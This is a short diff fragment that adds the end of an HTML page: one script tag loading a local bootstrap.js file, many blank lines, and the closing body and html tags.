+  <script type="text/javascript" src="/js/src/bootstrap.js?v=6.1.0"></script>
+
+
+
+  
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
